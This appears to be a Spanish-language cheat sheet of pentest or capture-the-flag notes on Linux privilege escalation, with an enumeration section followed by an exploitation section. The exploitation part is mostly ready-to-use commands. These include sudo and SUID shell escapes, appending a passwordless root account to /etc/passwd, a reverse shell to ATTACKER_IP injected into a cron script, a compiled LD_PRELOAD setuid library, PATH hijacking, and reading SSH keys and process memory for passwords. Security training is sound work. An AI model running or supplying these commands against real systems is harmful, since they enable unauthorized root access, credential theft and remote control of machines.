# Enumeration: Linux privilege escalation

## 🔍 Sección 1: Enumeración

### 1️⃣ Información del sistema

```bash
uname -a                   # Versión del kernel
cat /etc/os-release        # Información de la distribución
cat /etc/issue							
arch                       # Arquitectura del sistema
sudo -V
dmesg | tail 		   # Últimos mensajes del kernel
```

### 2️⃣ Usuarios y grupos

```bash
whoami                           # Usuario actual
id                               # UID y grupos
who -a                           # Usuarios conectados
last                             # Últimos logins
cat /etc/passwd                  # Lista de usuarios
cat /etc/shadow                  # Hashes de contraseñas (requiere root)
getent passwd                    # Usuarios desde NSS
sudo -l                          # Comandos sudo disponibles
groups <usuario>
```

### 3️⃣ Permisos y archivos sensibles

```bash
find / -perm -4000 2>/dev/null                      # Binarios con SUID
find / -perm -2000 2>/dev/null   	            # Binarios con SGID
find / -type f -writable 2>/dev/null                # Archivos con permisos de escritura
find /home -name '.*history' 2>/dev/null            # Historial de comandos
find / -type f -perm -g=w -group <grupo> 2>/dev/null       # Archivos con permiso de escritura por el grupo
find / -type f -writable -user $(whoami) 2>/dev/null       # Archivos escribibles por tu usuario actual (sin importar grupo)
find / -writable -group <grupo> 2>/dev/null                # directorios (para escribir archivos dentro)
find / -type f -perm -g=w -perm -111 -group <grupo> 2>/dev/null       # Buscar archivos ejecutables escribibles por el grupo
find /<directorio> -type d -perm -2 -ls 2>/dev/null
find / -user root -writable 2>/dev/null             # Archivos root escribibles
find / -type f -name '*.db' 2>/dev/null		    # Archivos base de datos
```

### Credenciales

```bash
# opciones:

--include="*.ini"
--include="*.yaml"
--include="*.yml"
--include="*.json"
--include="*.conf"

grep -rniI --include="*.conf" --include="*.ini" --include="*.yaml" --include="*.yml" --include="*.json" "PASSW\|PASSWD\|PASSWORD\|PWD" / 2>/dev/null

# V2
grep -rniI --include=*.{conf,ini,yaml,yml,json,php} "PASSW\|PASSWD\|PASSWORD\|PWD" / 2>/dev/null

find / -exec ls -lad $PWD/* "{}" 2>/dev/null \; | grep -i -I "passw\|pwd"

locate 'passw'
locate 'pwd'
locate '*.php'
```


### 4️⃣ Procesos y tareas en ejecución

```bash
ps aux | grep root              # Procesos ejecutados por root
ps -ef --forest                 # Jerarquía de procesos
ps -ef | grep <proceso>         # Información de un proceso específico
cat /proc/sched_debug | head    # Info de procesos
lsof -i                         # Conexiones activas
```

### 5️⃣ Servicios y conexiones

```bash
netstat -tulnp               # Puertos abiertos y servicios activos
ss -tulnp                    # Alternativa a netstat
iptables -L                  # Reglas de firewall
systemctl list-units --type=service  # Servicios activos
systemctl list-units --type=service --all
```

### 6️⃣ Cron jobs y timers

```bash
ls -lah /etc/cron*           # Revisar cron jobs
cat /etc/crontab            # Tareas programadas
systemctl list-timers       # Timers activos
systemctl list-timers --all
```

### 7️⃣ Variables de entorno

```bash
env                         # Variables de entorno
echo $PATH                  # Directorios en PATH
cat /etc/profile            # Variables globales
cat ~/.bashrc
```

### 8️⃣ Capacidades de binarios

```bash
getcap -r / 2>/dev/null     # Binarios con capacidades especiales
```

### 9️⃣ Contenedores y Docker

```bash
docker ps -a                # Contenedores en ejecución
cat /etc/group | grep docker # Ver si el usuario está en el grupo docker
ls -la /var/run/docker.sock
```

## 💥 Sección 2: Explotación

### 1️⃣ Explotación de SUDO mal configurado

```bash
sudo -l                     # Ver permisos sudo
sudo su                     # Si NOPASSWD está habilitado
sudo <comando>              # Ejecutar comandos con sudo
sudo -u root <comando>

# Ejemplos
sudo vim -c ':!/bin/sh'
sudo nmap --interactive
sudo find / -exec /bin/sh \;
sudo python3 -c 'import os; os.system("/bin/sh")'
```

### 2️⃣ SUID/SGID abuse

```bash
find / -perm -4000 2>/dev/null   # Buscar archivos con SUID
find / -perm -2000 2>/dev/null   # Buscar archivos con SGID
find / -perm -4000 -type f 2>/dev/null | xargs ls -la 
chmod 4755 /bin/bash             # Inyectar 
/bin/bash -p                     # Ejecutar bash con privilegios SUID
./vim -c ':!/bin/sh'

find / -perm -4000 -type f 2>/dev/null | xargs ls -la
```

### 3️⃣ Malos permisos en archivos y directorios

```bash
# Opcion 1
openssl passwd newpass
codedPass
echo 'root::0:0:codedPass:::/bin/bash' >> /etc/passwd  # Crear usuario root

# Opcion 2

echo "root2::0:0::/root:/bin/bash" >> /etc/passwd
su root2
```

### 4️⃣ Tareas cron y servicios inseguros

```bash
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" > /path/to/vulnerable_script.sh
```

### 5️⃣ Variables de entorno peligrosas

```bash
export PATH=/tmp:$PATH       # Modificar PATH
export LD_PRELOAD=/tmp/malicioso.so  # Cargar biblioteca maliciosa

export PATH=/tmp:$PATH
echo "/bin/bash" > /tmp/service
chmod +x /tmp/service
sudo vulnerable_binary

# LD_PRELOAD
echo 'void __attribute__((constructor)) init(){setuid(0); system("/bin/bash");}' > /tmp/x.c
gcc -fPIC -shared -o /tmp/x.so /tmp/x.c -nostartfiles
sudo LD_PRELOAD=/tmp/x.so <comando>

```

### 6️⃣ Explotación de procesos en ejecución

```bash
ps -ef | grep root
strace -p <PID>
gdb -p <PID>                # Adjuntar a un proceso
```

### 7️⃣ Explotación de servicios y configuraciones de red

```bash
showmount -e <IP>           # Revisar NFS
mount -t nfs <IP>:/ /mnt
```

### 8️⃣ Extracción de credenciales

```bash
cat ~/.bash_history         # Revisar historial de comandos
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys
strings /proc/<PID>/mem | grep -i pass
```

### 9️⃣ Kernel Exploits

```bash
uname -r                    # Revisar versión del kernel
searchsploit <versión>      # Buscar exploits para el kernel
```
